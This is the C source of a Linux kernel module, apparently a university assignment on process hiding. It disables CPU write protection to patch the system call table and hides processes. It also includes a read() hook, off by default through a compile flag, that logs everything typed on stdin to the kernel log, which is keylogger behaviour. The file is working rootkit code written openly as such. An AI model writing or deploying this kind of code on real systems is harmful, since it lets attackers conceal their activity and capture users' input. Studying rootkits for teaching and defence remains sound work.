#include <linux/module.h> /* Needed by all modules */
#include <linux/kernel.h> /* Needed for KERN_INFO */
#include <linux/init.h> /* Needed for the macros, hints for linking and loading, see http://tldp.org/LDP/lkmpg/2.6/html/x245.html */
#include <linux/sched.h>
#include <asm/page.h>
#include <asm/pgtable.h>
#include <asm/unistd.h>
#include <asm/processor-flags.h>
#include <linux/string.h>
#include <linux/slab.h>

#include "process_hiding.h"
#include "sysmap.h"

MODULE_LICENSE("GPL");

#define DRIVER_AUTHOR "Nicolas Appel, Wenwen Chen"
#define DRIVER_DESC   "Assigment 3 - Process Hiding"

MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);

#define HOOK_READ 0 

void ** syscall_table = (void * *) sys_call_table_R;
ssize_t (*orig_sys_read)(int fd, void *buf, size_t count);
char * buffer;
int r_count=0;


inline void disable_wp(void){
	write_cr0(read_cr0() & ~0x00010000);
}

inline void enable_wp(void){
	write_cr0(read_cr0() | 0x00010000);
}

static ssize_t my_read(int fd, void *buf, size_t count){
	static int buf_size = 0;
	ssize_t retVal;
	r_count++;
	retVal = orig_sys_read(fd, buf, count);
	if(fd == 0){ //stdin
		if(count >= buf_size){
			kfree(buffer);
			buffer = (char *) kmalloc(count+1, GFP_KERNEL);
		}
		if(buffer != NULL){
			strncpy(buffer, (char*)buf, count);
			buffer[count]='\0';
			printk(KERN_INFO "%s\n",buffer);
		}
	}
	r_count--;
	return retVal;
}


static int __init mod_init(void)
{
  disable_wp(); 
  
  hide_processes();
  orig_sys_read = syscall_table[__NR_read];
  
  //Disable nasty compiler warnings
  #if HOOK_READ == 1
   syscall_table[__NR_read] = my_read;
  #else
   (void) my_read;
  #endif
 
  enable_wp();
  
  return 0;
}

static void __exit mod_exit(void)
{
  disable_wp();
  syscall_table[__NR_read] = orig_sys_read;
  enable_wp();
  kfree(buffer);
  unhide_processes();
  while(r_count > 0){ //hack to unblock read
	printk(KERN_INFO "\n");
  }  
}



module_init(mod_init);
module_exit(mod_exit);


